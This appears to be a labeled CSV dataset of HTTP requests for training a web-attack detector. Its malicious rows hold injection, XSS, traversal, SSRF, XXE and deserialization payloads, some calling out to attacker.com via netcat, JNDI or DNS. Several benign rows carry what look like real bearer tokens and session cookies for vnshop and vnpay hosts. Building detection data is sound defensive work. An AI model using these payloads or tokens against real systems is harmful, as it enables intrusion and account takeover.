method,path,query,headers,body,ua,label
GET,/,,; cat /etc/passwd,,,1
GET,/,,id=1'; WAITFOR DELAY '0:0:5'--,,,1
GET,/,,GET / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 42\r\n,,,1
GET,/,,http://169.254.169.254/latest/meta-data/,,,1
PUT,/api/v1/users,,Host: example.com; Accept: */*,input=<img src=x onerror=alert(1)>,curl/7.68.0,1
GET,/,,..%c0%af..%c0%af..%c0%afetc/passwd,,,1
GET,/,,PATCH /api/v1/settings/theme,,,0
GET,/,,GET /stream/hls/chunk_001.ts,,,0
GET,/,,id=1&id=2,,,1
GET,/,,"{""id"": {""$bitsAllSet"": [1, 5]}}",,,1
GET,/,,{{7*7}}{{ '7'*7 }},,,1
GET,/,,${jndi:ldap://attacker.com/a},,,1
GET,/,,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">",,,1
GET,/,,GET /dashboard?view=summary&time=30d,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"POST /logs/client {""error"": ""Uncaught TypeError"", ""stack"": ""...""}",,,0
GET,/web-api/orders/bf465968-ca66-49ee-a972-85aa931692f4,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3NzA0MDcwMTEiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiNDNlYzk2M2YtM2M0Yi00N2ZiLWE2MjctZGI3ZDNlZmU0Mjk4IiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3NzA0MDcwMTEiLCJzdWIiOiJXRUJTSVRFQDA3NzA0MDcwMTEiLCJpYXQiOjE3NzA2MzAyNDEsImV4cCI6MTc3MTIzNTA0MX0.C8mIuHfzTuWcPffFdYqY8jJJuubX1GZ4Dy7FYVG4sqQ; Connection: keep-alive; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: b152963d-fd0d-4407-bd24-6afe2c0c619b",,python-requests/2.32.5,0
GET,/,,"{""id"": {""$bitsAllSet"": [1, 5]}}",,,1
GET,/,,gzip compressed content with chosen prefix,,,1
GET,/,,GET /api/v1/tasks/rep_99/status,,,0
GET,/p/moony-list-brand,_rsc=5m2h5,"Accept: */*; Accept-Encoding: gzip, deflate, br, zstd; Accept-Language: vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7; Connection: keep-alive; Cookie: _ga=GA1.1.306412280.1770767051; _ga_1XRVJ9DDS6=GS2.1.s1770767051$o1$g0$t1770767051$j60$l0$h0; _gcl_au=1.1.1945792225.1770767052; _tt_enable_cookie=1; _ttp=01KH4Z1VN3232YD1HTG6TBQRNV_.tt.1; _fbp=fb.1.1770767052605.531549660992189475; ttcsid_CQQA2PJC77U11VCBE7G0=1770767052488::pR2nsGQhyOvraodUwJJh.1.1770767054362.1; ttcsid_CQNEHUJC77UD2I8MDM90=1770767052481::8Hgycj37nJJBEHwGrd4e.1.1770767054652.1; ttcsid=1770767052484::GKdwbRteA4mC5UDygTZU.1.1770767054653.0; Host: agri-v2.vnshop.vn; Next-Router-Prefetch: 1; Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22100_shop%22%2C%7B%22children%22%3A%5B%5B%22merchant%22%2C%22vnshop%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%5B%22channel%22%2C%22CH1004%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%5B%22subchannel%22%2C%22VBA%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%5B%22locale%22%2C%22vi%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22landing%22%2C%7B%22children%22%3A%5B%5B%22slug%22%2C%22ta-bim-du-tru-tet-khoi-lo%22%2C%22c%22%5D%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%5D%7D%5D%7D%5D%7D%5D%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D; Next-Url: /100_shop/vnshop/CH1004/VBA/vi/landing/ta-bim-du-tru-tet-khoi-lo; Referer: https://agri-v2.vnshop.vn/landing/ta-bim-du-tru-tet-khoi-lo; Rsc: 1; Sec-Ch-Ua: ""Not(A:Brand"";v=""8"", ""Chromium"";v=""144"", ""Android WebView"";v=""144""; Sec-Ch-Ua-Mobile: ?1; Sec-Ch-Ua-Platform: ""Android""; Sec-Fetch-Dest: empty; Sec-Fetch-Mode: cors; Sec-Fetch-Site: same-origin; User-Agent: Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro Build/SKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.109 Mobile Safari/537.36; X-Requested-With: com.vnpay.Agribank3g",,"Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro Build/SKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.109 Mobile Safari/537.36",0
GET,/,,PATCH /api/v1/settings/theme,,,0
GET,/,,HEAD /assets/large-video.mp4,,,0
GET,/,,{{7*7}} or {{config.items()}},,,1
GET,/,,"<iframe src=""http://169.254.169.254/latest/meta-data/""></iframe>",,,1
GET,/,,GET /login,,,0
GET,/,,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}",,,1
GET,/,,GET /images/logo.png,,,0
GET,/,,POST /collect?v=1&tid=UA-XXXXX,,,0
GET,/,,../../../../tmp/shell.php (inside zip archive),,,1
GET,/,,..%2f..%2f..%2fetc%2fshadow,,,1
GET,/,,(&(uid=admin)(|(password=*))),,,1
GET,/,,POST /newsletter/subscribe,,,0
GET,/,,PATCH /api/v1/settings/theme,,,0
GET,/,,..\..\..\..\windows\system32\config\sam,,,1
GET,/,server=db&username=root&db=mysql&table=event%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:35.0) Gecko/20100101 Firefox/35.0,,Mozilla/5.0 (Windows NT 5.1; rv:35.0) Gecko/20100101 Firefox/35.0,1
GET,/,,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,1
GET,/,,GET /user/mfa/setup-qr,,,0
GET,/,,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}",,,1
GET,/,,http://169.254.169.254/latest/meta-data/,,,1
GET,/,,GET /fonts/inter-bold.woff2,,,0
GET,/,,GET /auth/verify-email?code=v987654321,,,0
GET,/,,GET /static/icons/heart.svg,,,0
GET,/,,"POST /api/v1/posts/55/comments {""text"": ""Great article!""}",,,0
GET,/,,id=1'; WAITFOR DELAY '0:0:5'--,,,1
GET,/,,GET /podcasts/latest.xml,,,0
POST,/blog/article-1,,Host: example.com; Accept: */*,username=user519&password=pass132,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,GET /user/mfa/setup-qr,,,0
GET,/,,GET /api/v1/ping,,,0
GET,/,,"{""alg"":""RS256"",""kid"":""../../../../dev/null"",""typ"":""JWT""}",,,1
GET,/,,GET /admin/users?limit=20&offset=40,,,0
GET,/,,User-Agent: ' OR SLEEP(5) OR ',,,1
GET,/,,; echo $USER | nc attacker.com 1234,,,1
GET,/,,GET /blog/future-of-ai-2026,,,0
GET,/,,__proto__[admin]=true,,,1
GET,/,,GET /search?q=C%23,,,0
GET,/,,POST /webhooks/stripe (Payment Success),,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"POST /api/v1/deliver/kindle {""book_id"": ""b_772""}",,,0
GET,/,,"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\""/+/onmouseover=1/(f=prompt,f(1))//'>",,,1
GET,/,,id=1; SELECT pg_sleep(5)--,,,1
GET,/,,PATCH /api/v1/settings/theme,,,0
GET,/,,java\tscript:alert(1),,,1
GET,/,,GET /maps/v2/tile/10/512/324.png,,,0
POST,/admin,,Host: example.com; Accept: */*,input=admin'--,sqlmap/1.5.2,1
GET,/,,GET /settings/security,,,0
GET,/,,query { __schema { types { name } } },,,1
GET,/,,id=1' OR '1'='1,,,1
GET,/,,..\..\..\..\windows\system32\config\sam,,,1
GET,/,,"POST /team/invite {""email"": ""colleague@work.com""}",,,0
GET,/favicon.ico,,,,,0
GET,/,,"<!ENTITY % payload SYSTEM ""file:///etc/passwd""> %payload;",,,1
PUT,/admin,,Host: example.com; Accept: */*,input=http://169.254.169.254/latest/meta-data,Nikto/2.1.6,1
GET,/,,GET /search?q=security,,,0
GET,/,,"POST /legal/tos/accept {""version"": ""2.1.0""}",,,0
GET,/,,' or string-length(name(.)) > 0 or '1'='1,,,1
GET,/,,GET /products/compare?base=p1&target=p2,,,0
GET,/,,"#set($str=$class.inspect(""java.lang.Runtime"").type.getRuntime().exec(""id""))",,,1
GET,/favicon.ico,,,,,0
GET,/,,http://169.254.169.254/latest/meta-data/,,,1
GET,/,,GET /help/kb/search?query=how+to+reset+password,,,0
GET,/,,"POST /privacy/consent {""analytics"": true, ""marketing"": false}",,,0
GET,/favicon.ico,,,,,0
GET,/,,GET /user/orders?status=shipped&from=2025-01-01,,,0
GET,/,,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">",,,1
GET,/,,"POST /chat/init {""user_id"": ""u_55"", ""topic"": ""billing""}",,,0
GET,/,,GET /fonts/inter-bold.woff2,,,0
GET,/,,GET /login,,,0
GET,/,,GET /podcasts/latest.xml,,,0
GET,/,,OPTIONS /api/v1/data,,,0
GET,/,,"POST /user/ui/theme {""mode"": ""dark""}",,,0
GET,/api/v1/users,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/products,id=123,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,GET /login,,,0
GET,/,,id=1' OR '1'='1,,,1
GET,/,,GET /admin/users?limit=20&offset=40,,,0
GET,/,,GET /static/css/style.css,,,0
GET,/,,"<!ENTITY % payload SYSTEM ""file:///etc/passwd""> %payload;",,,1
GET,/,,(&(uid=admin)(|(password=*))),,,1
GET,/,,POST /blog/comment (valid user text),,,0
GET,/,,"POST /auth/mfa/verify {""code"": ""123456""}",,,0
GET,/,,http://attacker.com/shell.txt,,,1
GET,/,,"PUT /api/v1/user/settings {""avatar_url"": ""https://img.com/u1.png""}",,,0
GET,/,,DELETE /api/v1/cart/items/5,,,0
GET,/,,GET /checkout/success?order_id=ord_123,,,0
GET,/,,\x81\xfe\x00\x00... (illegal length),,,1
GET,/,,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/,,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,1
GET,/,,php://filter/convert.base64-encode/resource=index.php,,,1
GET,/,,id=0x27204f52202731273d2731,,,1
GET,/,,"POST /api/v1/sync/video {""id"": ""v_123"", ""position"": 450}",,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
PUT,/search,,Host: example.com; Accept: */*,"input="" onmouseover=alert(1) """,Nikto/2.1.6,1
GET,/,,dict://localhost:11211/stat,,,1
GET,/,,phar://path/to/malicious.phar/shell.php,,,1
GET,/,,"POST /user/password-update {""old"": ""pass1"", ""new"": ""pass2""}",,,0
GET,/,,GET /fonts/inter-bold.woff2,,,0
GET,/,,"{""__proto__"": {""isAdmin"": true}}",,,1
GET,/,,GET /podcasts/latest.xml,,,0
GET,/,,GET /checkout/step1,,,0
GET,/,,POST /cart/add?product_id=99,,,0
GET,/,,http://169.254.169.254/latest/meta-data/,,,1
GET,/,,; echo $USER | nc attacker.com 1234,,,1
GET,/,,POST /auth/password-reset-request,,,0
GET,/,,GET /api/v1/products,,,0
GET,/,,GET /products/compare?base=p1&target=p2,,,0
GET,/,,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\a')))",,,1
GET,/,,%0d%0aSet-Cookie: session=attacker,,,1
GET,/,,../../../../etc/passwd%00,,,1
GET,/,,GET /health,,,0
GET,/,,GET /products?sort=price_desc&page=1,,,0
GET,/,,"<video><source onerror=""alert(1)"">",,,1
GET,/,,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">",,,1
GET,/,,GET /dashboard?view=summary&time=30d,,,0
GET,/,,phar://path/to/malicious.phar/shell.php,,,1
DELETE,/api/v1/users,,Host: example.com; Accept: */*,input=' OR 1=1--,curl/7.68.0,1
GET,/,,GET /api/v1/locale/set?lang=en,,,0
GET,/,,|| ls -la,,,1
GET,/,,GET /images/logo.png,,,0
GET,/,,GET /docs/api/introduction,,,0
GET,/,,GET /blog/future-of-ai-2026,,,0
GET,/,,GET /manifest.json,,,0
GET,/,,POST /collect?v=1&tid=UA-XXXXX,,,0
GET,/,,"{""alg"":""RS256"",""kid"":""../../../../dev/null"",""typ"":""JWT""}",,,1
GET,/,,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,1
GET,/,,PATCH /api/v1/settings/theme,,,0
GET,/,,"POST /logs/client {""error"": ""Uncaught TypeError"", ""stack"": ""...""}",,,0
GET,/,,..%252f..%252f..%252fetc%252fhosts,,,1
POST,/index.php,,Host: example.com; Accept: */*,input=admin'--,Nikto/2.1.6,1
GET,/favicon.ico,,,,,0
GET,/,,"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\""/+/onmouseover=1/(f=prompt,f(1))//'>",,,1
GET,/,,GET /auth/logout/confirm,,,0
GET,/,,GET /docs/api/introduction,,,0
GET,/,,GET /dashboard?view=summary&time=30d,,,0
GET,/,,GET /login,,,0
GET,/,,//////////////////etc/passwd,,,1
POST,/login,,Host: example.com; Accept: */*,username=user864&password=pass113,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,,1
GET,/,,GET /search?q=1+1=2,,,0
GET,/,,GET / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 42\r\n,,,1
GET,/,,GET /stream/audio/segment_77.aac,,,0
GET,/,,%0d%0aBcc: victim@example.com,,,1
GET,/,,POST /auth/password-reset-request,,,0
GET,/,,GET /admin/reports/sales.csv?year=2025,,,0
GET,/,,$(whoami),,,1
POST,/test-framework-api/node/node/sys-task/053cb910-a251-4683-883e-4d42ae1389c8/next-message/1770690633,,"Accept-Encoding: gzip, x-gzip, deflate; Authorization: Bearer eyJraWQiOiJMbHFRYVBsYXRmb3JtIiwiYWxnIjoiUlMyNTYifQ.eyJpc3MiOiJMbHFRYVBsYXRmb3JtIiwianRpIjoiNDRlM2FkNDAtZjk3MS00ZTIyLWExNzEtN2ZjZjdmYjZjMjg4Iiwic3ViIjoibGluaG5kMkB2bnBheS52biIsImVtYWlsIjoibGluaG5kMkB2bnBheS52biIsInRva2VuVHlwZSI6Ik5PREUifQ.DtYHgQvhdbidHrh2NhfmxUwW4U4FwTA9gA2XmRtCXOFmF7ml_cA7wRFQCcOzYBVmJs-OJZ5zLAnDXeOboK81N42VpuWCZOSob4EEO41x-lKqXweGduTAAwsHm4ZhQ73ms4_a0xD6hL11hX55vxoSGyz1NY45yFcDBr18D-8k9dJTEMkuzlZG16WdP7xJ61CYg9XaekXAmiatkSEs8GjzT7lVGF7Ls87Nbi6FkkHt-tr2o77uiGqfKqxNTRyJovNGYqjKk6gN3MCc1o-Qo9e2FotfSxWp3Bz8rERYNoE-JborCLv6Fjj-pHC1Spzadj5wwWbV12_NnlSVYyaT-_lKQg; Cache-Control: no-cache; Connection: keep-alive; Content-Length: 0; Cookie: __Host-grv_app_session_subject=f0bb13ae464b39453391cb6dc0d4e1e62eeb8857b39548344a1b93a559d46740; __Host-grv_app_session=67a4d64fcf1b4d31f0af98d4b868ef5528a1bb9f44dfc6f98df7751a6d938386; Host: lqa.vnpaytest.vn; Node-Version: v1.0.0; User-Agent: Apache-HttpClient/5.4.1 (Java/17.0.4.1); X-Request-Id: 5899396a-6e9a-471d-9488-a42b2f3228d5",,Apache-HttpClient/5.4.1 (Java/17.0.4.1),0
GET,/,,//////////////////etc/passwd,,,1
GET,/products,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,id=1; SELECT pg_sleep(5)--,,,1
PUT,/admin,,Host: example.com; Accept: */*,input=<script>alert(1)</script>,Nmap Scripting Engine,1
GET,/,,GET /maps/v2/tile/10/512/324.png,,,0
GET,/,,"POST /user/password-update {""old"": ""pass1"", ""new"": ""pass2""}",,,0
GET,/,,id=1; DROP TABLE users--,,,1
GET,/,,GET /api/v1/map/data?lat=21.0285&lng=105.8542&zoom=15,,,0
GET,/,,<body onload=alert(1)>,,,1
GET,/,,GET /checkout/success?order_id=ord_123,,,0
GET,/,,GET /products/compare?base=p1&target=p2,,,0
GET,/,,GET /images/hero-banner.webp,,,0
GET,/,,"<foo xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""file:///etc/passwd""/></foo>",,,1
GET,/,,cos\nsystem\n(S'id'\ntR.,,,1
GET,/,,PUT /api/v1/profile (JSON payload),,,0
GET,/home,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
POST,/search,q=phone,Host: example.com; Accept: */*,username=user585&password=pass111,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,GET /checkout/step1,,,0
GET,/,,"<!ENTITY % payload SYSTEM ""file:///etc/passwd""> %payload;",,,1
GET,/,,GET /blog/future-of-ai-2026,,,0
GET,/,,id=1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'A%')--,,,1
DELETE,/login,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
PUT,/admin,,Host: example.com; Accept: */*,input=<img src=x onerror=alert(1)>,Nikto/2.1.6,1
GET,/,,"<iframe src=""http://169.254.169.254/latest/meta-data/""></iframe>",,,1
GET,/favicon.ico,,,,,0
GET,/,,"POST /user/ui/theme {""mode"": ""dark""}",,,0
GET,/,,GET /auth/google/callback,,,0
GET,/,,GET /api/v1/support/tickets/404/attachments,,,0
GET,/,,' or string-length(name(.)) > 0 or '1'='1,,,1
GET,/,,(&(uid=admin)(|(password=*))),,,1
GET,/,,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,1
GET,/,,GET /products?category=electronics&brand=apple,,,0
GET,/,,OPTIONS /api/v1/data,,,0
GET,/,,GET /api/v1/support/tickets/404/attachments,,,0
GET,/,,GET /api/v1/support/tickets/404/attachments,,,0
GET,/,,php://filter/convert.base64-encode/resource=index.php,,,1
GET,/favicon.ico,,,,,0
GET,/,,GET /products?category=electronics&brand=apple,,,0
GET,/,,"<iframe src=""https://target.com"" style=""opacity:0.5""></iframe>",,,1
GET,/,,GET /search?q=machine+learning,,,0
GET,/favicon.ico,,,,,0
GET,/,,{smart_f_shell_exec('id')},,,1
GET,/,,"<a href=""http://malicious.com"" target=""_blank"">Click here</a>",,,1
GET,/,,"{""name"": ""__import__('os').system('id')""}",,,1
GET,/,,GET /podcasts/latest.xml,,,0
GET,/,,id=1'/**/OR/**/'1'='1,,,1
GET,/,,"POST /contact (name, email, message)",,,0
GET,/,,GET /images/logo.png,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /images/logo.png,,,0
GET,/,,GET /user/mfa/setup-qr,,,0
GET,/favicon.ico,,,,,0
GET,/,,gopher://localhost:6379/_SET%20foo%20bar,,,1
GET,/,,POST /auth/password-reset-request,,,0
GET,/,,POST /graphql (query { me { name } }),,,0
GET,/,,GET /search?q=C%23,,,0
GET,/,,GET /locales/vi-VN.json,,,0
GET,/,,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,1
GET,/,,GET /stream/hls/chunk_001.ts,,,0
GET,/,,[Binary Frame] 0x89 (Ping),,,0
GET,/favicon.ico,,,,,0
POST,/search,,Host: example.com; Accept: */*,input=&& whoami,curl/7.68.0,1
GET,/,,X-Forwarded-Host: attacker.com,,,1
GET,/,,$(whoami),,,1
GET,/,,id=1; SELECT pg_sleep(5)--,,,1
PUT,/cart,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,"POST /wishlist/add {""item_id"": ""it_888""}",,,0
GET,/,,GET /auth/verify-email?code=v987654321,,,0
GET,/,,' or string-length(name(.)) > 0 or '1'='1,,,1
GET,/favicon.ico,,,,,0
GET,/,,GET /dashboard?view=summary&time=30d,,,0
GET,/,,"{""__proto__"": {""isAdmin"": true}}",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/search,,Host: example.com; Accept: */*,input=<img src=x onerror=alert(1)>,Nmap Scripting Engine,1
GET,/,,"id=1 UNION SELECT null, user(), database()--",,,1
GET,/,,GET /maps/v2/tile/10/512/324.png,,,0
GET,/,,"POST /api/v1/sync/video {""id"": ""v_123"", ""position"": 450}",,,0
GET,/,,GET /api/v1/tasks/rep_99/status,,,0
GET,/,,"<video><source onerror=""alert(1)"">",,,1
GET,/,,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,,1
GET,/,,"<a href=""http://malicious.com"" target=""_blank"">Click here</a>",,,1
GET,/,,"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\""/+/onmouseover=1/(f=prompt,f(1))//'>",,,1
GET,/,,cos\nsystem\n(S'id'\ntR.,,,1
GET,/,,\x81\xfe\x00\x00... (illegal length),,,1
GET,/,,GET /checkout/success?order_id=ord_123,,,0
GET,/,,GET /assets/js/bundle.min.js,,,0
GET,/favicon.ico,,,,,0
GET,/,,phar://path/to/malicious.phar/shell.php,,,1
GET,/,,GET /checkout/success?order_id=ord_123,,,0
GET,/,,GET /search?q=C%23,,,0
GET,/,,GET / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 42\r\n,,,1
GET,/,,GET /search?q=1+1=2,,,0
GET,/,,; echo $USER | nc attacker.com 1234,,,1
GET,/,,POST /api/v1/login (username/password),,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,PUT /api/v1/profile (JSON payload),,,0
GET,/,,GET /search?q=machine+learning,,,0
GET,/favicon.ico,,,,,0
GET,/,,(&(uid=admin)(|(password=*))),,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"PUT /api/v1/user/settings {""avatar_url"": ""https://img.com/u1.png""}",,,0
POST,/api/v1/users,,Host: example.com; Accept: */*,input=http://169.254.169.254/latest/meta-data,Nmap Scripting Engine,1
GET,/,,' or '1'='1,,,1
GET,/,,POST /api/v1/logs/frontend (traceback),,,0
GET,/,,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,1
GET,/,,GET /search?q=security,,,0
GET,/,,POST /api/v1/documents (binary stream),,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,../../../../etc/passwd%00,,,1
GET,/,,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,1
GET,/login,q=..\..\..\windows\system32,Host: example.com; Accept: */*,,sqlmap/1.5.2,1
GET,/,,POST /api/v1/logs/frontend (traceback),,,0
GET,/,,GET /api/v1/support/tickets/404/attachments,,,0
GET,/,,POST /api/v1/login (username/password),,,0
GET,/,,GET /stream/audio/segment_77.aac,,,0
GET,/,,//////////////////etc/passwd,,,1
GET,/,,"POST /careers/apply {""job_id"": ""eng_01"", ""name"": ""John Doe""}",,,0
GET,/,,..%c0%af..%c0%af..%c0%afetc/passwd,,,1
GET,/,,GET /feed/news.rss,,,0
GET,/,,"POST /team/invite {""email"": ""colleague@work.com""}",,,0
GET,/,,..%252f..%252f..%252fetc%252fhosts,,,1
GET,/,,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,1
GET,/,,GET /docs/api/introduction,,,0
GET,/,,GET /ws/notifications (Upgrade: websocket),,,0
GET,/,,%0als,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,../../../../etc/passwd,,,1
GET,/,,..%2f..%2f..%2fetc%2fshadow,,,1
GET,/,,GET /api/v1/support/tickets/404/attachments,,,0
GET,/,,"{""$where"": ""function() { return this.name == 'admin' }""}",,,1
GET,/,,GET /search?q=machine+learning+NOT+python,,,0
GET,/favicon.ico,,,,,0
GET,/,,GET /ws/notifications (Upgrade: websocket),,,0
GET,/,,dict://localhost:11211/stat,,,1
GET,/,,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",,,1
GET,/,,{{7*7}} or {{config.items()}},,,1
GET,/,,POST /webhooks/github (Push Event),,,0
GET,/,,//////////////////etc/passwd,,,1
GET,/,,POST /cart/add?product_id=99,,,0
GET,/,,"{""$where"": ""this.user == 'admin'""}",,,1
